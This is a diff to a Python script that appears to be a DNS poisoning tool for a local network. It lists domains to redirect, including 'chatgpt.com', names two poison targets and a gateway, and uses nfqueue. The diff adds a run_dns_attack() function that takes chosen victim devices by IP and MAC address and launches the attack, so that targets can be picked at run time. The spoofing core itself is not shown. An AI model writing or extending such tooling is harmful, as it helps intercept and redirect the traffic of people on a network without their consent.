@@ -29,10 +29,10 @@ REDIRECT_DOMAINS = [
     'chatgpt.com'
 ]
 
-# Use configuration values
-target_1 = AttackConfig.POISON_TARGET_1
-target_2 = AttackConfig.POISON_TARGET_2  
-gateway_device = AttackConfig.GATEWAY_DEVICE
+# Use configuration values - these will be set dynamically by run_dns_attack()
+target_1 = None  # Will be set by run_dns_attack()
+target_2 = None  # Will be set by run_dns_attack()
+gateway_device = None  # Will be set by run_dns_attack()
 interface = NetworkConfig.INTERFACE
 
 # Setup detailed logging
@@ -40,7 +40,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('dns_attack_fixed.log'),
+        logging.FileHandler('dns_attack.log'),
         logging.StreamHandler()
     ]
 )
@@ -273,6 +273,40 @@ def main():
     finally:
         nfqueue.unbind()
         cleanup_handler(None, None)
+
+def run_dns_attack(target_1_device, target_2_device, gateway_device_param):
+    """Run DNS attack with specified devices"""
+    
+    # Override the global variables with new device data
+    global target_1, target_2, gateway_device
+    
+    # Create Device objects from the device dictionaries
+    target_1 = type('Device', (), {
+        'name': target_1_device.get('hostname', 'target_1'),
+        'ip': target_1_device['ip'],
+        'mac': target_1_device['mac'],
+        'device_type': target_1_device.get('device_type', 'unknown'),
+        'description': 'Selected Target 1'
+    })()
+    
+    target_2 = type('Device', (), {
+        'name': target_2_device.get('hostname', 'target_2'),
+        'ip': target_2_device['ip'],
+        'mac': target_2_device['mac'],
+        'device_type': target_2_device.get('device_type', 'unknown'),
+        'description': 'Selected Target 2'
+    })()
+    
+    gateway_device = type('Device', (), {
+        'name': gateway_device_param.get('hostname', 'gateway'),
+        'ip': gateway_device_param['ip'],
+        'mac': gateway_device_param['mac'],
+        'device_type': gateway_device_param.get('device_type', 'router'),
+        'description': 'Selected Gateway'
+    })()
+    
+    # Run the main function
+    main()
 
 if __name__ == "__main__":
     main() 
